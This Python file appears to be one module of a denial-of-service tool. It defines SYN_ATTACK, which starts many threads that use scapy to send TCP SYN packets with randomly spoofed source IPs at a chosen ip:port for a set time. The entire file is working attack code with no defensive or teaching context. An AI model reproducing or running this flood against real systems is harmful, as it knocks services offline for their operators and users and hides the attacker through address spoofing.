import random
import time
from scapy.all import IP, TCP, send
from threading import Thread
# Import modules for SYN flood
import tools.randomData as randomData

def SYN_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("[#] Attack started for " + str(attack_time) + " secounds..")
	

	threads_list = []

	# SYN flood
	def syn_flood():
		global FINISH
		while True:
			if FINISH:
				break

			IP_Packet = IP()
			IP_Packet.src = randomData.random_IP()
			IP_Packet.dst = target_ip

			TCP_Packet = TCP()	
			TCP_Packet.sport = random.randint(1000, 10000)
			TCP_Packet.dport = target_port
			TCP_Packet.flags = "S"
			TCP_Packet.seq = random.randint(1000, 10000)
			TCP_Packet.window = random.randint(1000, 10000)
			try:
				send(IP_Packet / TCP_Packet, verbose = False)
			except Exception as e:
				print(e)
			else:
				print("[+] SYN packet sent!")

	# Start threads
	for thread in range(0, threads):
		print("[#] Staring thread " + str(thread))
		t = Thread(target = syn_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("[!] SYN attack stopped!")